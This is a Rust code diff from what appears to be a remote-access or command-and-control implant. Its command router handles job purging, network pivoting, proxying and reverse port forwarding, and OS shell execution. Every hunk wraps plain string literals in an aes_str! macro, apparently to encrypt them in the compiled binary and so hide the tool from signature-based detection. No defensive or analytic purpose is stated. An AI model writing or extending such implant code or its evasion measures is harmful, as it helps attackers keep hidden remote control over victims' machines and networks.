@@ -64,7 +64,7 @@ macro_rules! lock_or_action {
             Ok(guard) => guard,
             Err(_) => {
                 return DispatchResult::Reply(
-                    String::new(), format!("Internal: {} lock poisoned", $name), 1, AgentAction::None
+                    String::new(), format!("{}: {} {}", aes_str!("Internal"), $name, aes_str!("lock poisoned")), 1, AgentAction::None
                 );
             }
         }
@@ -133,7 +133,7 @@ async fn route(ctx: &HandlerContext, cmd: &str, req_id: u64) -> DispatchResult {
     }
     if cmd == aes_str!("jobs:purge") {
         let n = lock_or_action!(ctx.job_manager, aes_str!("job_manager")).purge_completed();
-        return DispatchResult::Reply(format!("Purged {} finished jobs", n), String::new(), 0, AgentAction::None);
+        return DispatchResult::Reply(format!("{} {} {}", aes_str!("Purged"), n, aes_str!("finished jobs")), String::new(), 0, AgentAction::None);
     }
 
     // ── Network (pivot, proxy, rportfwd) ───────────────────────────
@@ -293,7 +293,7 @@ async fn route(ctx: &HandlerContext, cmd: &str, req_id: u64) -> DispatchResult {
     // ── Unknown command ────────────────────────────────────────────
     DispatchResult::Reply(
         String::new(),
-        format!("Unknown command: '{}'. Use 'shell <cmd>' or '!<cmd>' for OS shell execution.", cmd),
+        format!("{}: '{}'. {}", aes_str!("Unknown command"), cmd, aes_str!("Use 'shell <cmd>' or '!<cmd>' for OS shell execution.")),
         1,
         AgentAction::None,
     )
